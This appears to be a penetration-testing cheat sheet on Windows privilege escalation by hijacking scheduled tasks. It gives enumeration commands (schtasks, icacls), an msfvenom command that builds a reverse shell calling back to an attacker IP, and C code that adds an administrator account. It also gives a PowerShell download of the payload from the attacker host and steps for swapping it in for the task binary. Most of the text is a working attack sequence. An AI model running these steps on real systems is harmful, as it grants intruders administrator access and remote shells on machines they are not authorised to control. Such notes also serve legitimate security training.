Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
* As which user account (principal) does this task get executed?

If the task runs as NT AUTHORITY\SYSTEM or as an administrative user, then a successful attack could lead to privilege escalation.
* What triggers are specified for the task?

If the trigger condition was met in the past, the task will not run again in the future and therefore, is not a viable target.
* What actions are executed when one or more of these triggers are met?

Programs and scripts specified by actions can be replaced with payloads or exploited.
# Enumerate Scheduled Tasks
```powershell
Get-ScheduledTask
```
```batch
schtasks /query /fo LIST /v
```
# Enumerate interesting Task Binaries
```batch
icacls C:\Path\To\Task\ToRun.exe
```
If there is F, W or those permissions are inherited (I) - we can replace the exe with our own payload.
# Create new malicious task binary
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o reverse.exe
```
Example malicious service to use:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
On kali, cross-compile the service:
```batch
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
# Hijack interesting task with a malicious binary
Transfer the service to the target machine:
```powershell
iwr -uri http://$(IP_ADDRESS)/adduser.exe -Outfile adduser.exe
```
Backup the original interesting service:
```powershell
move C:\path\to\interesting\TaskToRun.exe Task.exe
```
Replace service binary with new malicious service:
```powershell
move .\adduser.exe C:\path\to\interesting\TaskToRun.exe
```
